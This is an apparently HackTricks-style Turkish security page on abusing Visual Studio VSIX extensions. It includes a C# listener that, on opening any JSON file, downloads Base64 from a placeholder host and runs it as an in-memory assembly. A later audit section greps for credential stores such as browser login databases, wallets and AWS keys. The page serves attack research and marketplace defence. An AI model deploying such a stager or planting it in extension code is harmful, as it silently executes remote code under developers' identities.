# Visual Studio VSIX Uzantılarını Kötüye Kullanma

{{#include ../banners/hacktricks-training.md}}

Bir Visual Studio uzantısı, rutin düzenleyici etkinliklerini oturum açmış kullanıcının kimliği altında kod yürütme fırsatına dönüştürebilir. Kötü amaçlı bir VSIX, benzer görünümlü bir yayıncı veya güvenliği ihlal edilmiş bir uzantı güncellemesi, normal yükleme kanalları üzerinden kullanıcıya ulaşabilir. Yönetici istemiyle yükleme, kullanıcının onay verdiği bir yükleme yoludur; otomatik bir ayrıcalık yükseltme değildir.<sup>[[1]](#references)</sup>

## Yürütme modeli

Klasik VSSDK uzantıları genellikle `devenv.exe` içinde çalışır. Daha yeni `VisualStudio.Extensibility` modeli, modern .NET uzantılarını çoğunlukla süreç dışında çalıştırır: Visual Studio çağrıları, özel bir `Microsoft.ServiceHub.Host.Extensibility` sürecine yönlendirir. Bu, IDE kararlılığını korur ancak uzantıyı kullanıcının Windows izinlerinden **sandbox ile yalıtmaz**. Çalıştırılabilir dosyanın tam adı, `ServiceHub.Host.Extensibility.arm64.exe` gibi bir mimari soneki içerebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Sıradan düzenleyici etkinliklerinde tetikleme

Bir uzantı, yalnızca kolayca fark edilen bir menü komutu sunmak yerine `ITextViewOpenClosedListener` uygulayabilir. `TextViewOpenedAsync` geri çağrısı, eşleşen belgeler için çağrılırken `TextViewExtensionConfiguration.AppliesTo`, etkinleştirmeyi JSON gibi yaygın bir türle sınırlayabilir. Gerçek bir biçimlendirici veya linter, dosya açıldığında yan etki olarak ikinci bir eylem yürütürken tanıtımında vaat ettiği işi de yapabilir.<sup>[[1]](#references)[[3]](#references)</sup>

Aşağıdaki sadeleştirilmiş örüntü, önemli yürütme noktalarını gösterir; açıklık için meşru biçimlendiriciyi ve hata işlemeyi içermez.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Olay tetiklemeli, bellek içi yönetilen assembly yükleyici</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Bu zincir Base64 metnini indirir, assembly baytlarına çözer, bunları collectible bir `AssemblyLoadContext` üzerinden `MemoryStream`'den yükler, yansıtılan `EntryPoint`'i parametresiz veya `string[]` ile çağırır, asenkron giriş noktalarını bekler ve context'i unload eder. İkinci aşama diske yazılmaz; ancak VSIX ve birincil extension DLL'i disk artefaktları olarak kalır. Base64, özgünlük veya gizlilik sağlamaz; HTTP kullanımı da aradaki bir saldırganın yanıtı değiştirmesine olanak tanır.<sup>[[1]](#references)</sup>

Operasyonel varyasyonlar arasında, staging başarısız olduğunda duyurulan özelliğin çalışmaya devam etmesi için tüm istisnaları bastırmak veya düzenlemelerden sonra tetiklenmesi için `ITextViewChangedListener` kullanmak yer alır. Kod, extension host içinde çalışır ve bu kullanıcı için kullanılabilir managed API'leri, P/Invoke'u, dosyaları, kimlik bilgilerini ve alt süreçleri kullanabilir.<sup>[[1]](#references)</sup>

Native plugin autoloading tabanlı, editöre özgü ilişkili bir yürütme yüzeyi için bkz.:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace ve dağıtım güveninin kötüye kullanılması

VSIX; doğrudan paylaşılan veya phishing yoluyla gönderilen bir dosya olarak, web Marketplace'ten ya da Visual Studio'nun yerleşik Marketplace tarayıcısı üzerinden gelebilir. Temelde benzersizliği ve ayrılmış sözcük listesini uygulayan yayıncı kaydı, görsel olarak yanıltıcı yayıncı kimliklerine izin verebilir. Önceden güvenilen bir yayıncı veya extension'ı ele geçirmek daha da etkilidir; çünkü yüklü bir kullanıcı tabanını devralır. Marketplace kurulumu Visual Studio Installer'ı başlatır ve indirilen VSIX'i geçici olarak `%LOCALAPPDATA%\Temp` altına yerleştirir; `payload.vsix` adı meşru biçimde de kullanıldığından, yalnızca dosya adı bir gösterge değildir.<sup>[[1]](#references)</sup>

MDSec, bir extension'ı doğrudan yükleyen bir Visual Studio URL protokolü tespit etmedi. Operatörün yine de kullanıcının VSIX'i yüklemesini/güvenmesini sağlaması veya mevcut bir extension'ın dağıtım yolunu ele geçirmesi gerekir. `AllUsers` paketi Visual Studio kurulum klasörüne yüklenir ve yükseltme isteyebilir; ancak bu, otomatik olarak administrator veya SYSTEM erişimi sağlamaz, normal ve kullanıcı onayına dayalı bir installer davranışıdır.<sup>[[1]](#references)[[4]](#references)</sup>

### Ölçekli statik denetim

VSIX paketleri genellikle ZIP kapsayıcılarıdır. Bu nedenle güvenli bir Marketplace inceleme pipeline'ı paketleri listeleyebilir, extension kodunu **yüklemeden** açabilir, manifestleri ayrıştırabilir, yürütülebilir yüzeyleri belirleyebilir ve managed assembly'leri `ilspycmd` ile decompile edebilir. Yaygın paketlenmiş bağımlılıkları hariç tuttuktan sonra extension'a ait assembly'lere öncelik verin; ardından kimlik bilgisi deposuna ait dizeleri dosya okuma ile ağa gönderme, kodlama ile gönderme, indirme ile yürütme, kimlik bilgisi yöneticisi ile ağ erişimi veya ekran görüntüsü ile gönderme gibi davranış kümeleriyle ilişkilendirin.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Ayrıca tüm yürütme yüzeylerinin managed code olduğunu varsaymak yerine native DLL'leri, MSBuild hedeflerini, script'leri, T4 şablonlarını ve installer payload'larını da envantere alın. Şüpheli davranışları manifest'in beyan ettiği amaçla karşılaştırın; telemetri ve meşru güncelleyiciler, veri sızdırma veya staging'e benzeyebilir. Yalnızca statik inceleme; paketlenmiş, gizlenmiş, dinamik olarak çözümlenen ve etkin olmayan kodları gözden kaçırır. Yalnızca en son sürümü incelemek de geçmişteki kötü amaçlı sürümleri gözden kaçırır.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Visual Studio Eklentileri Yeniden İncelendi](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility Hakkında](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX paketinin yapısı](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET aracı](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
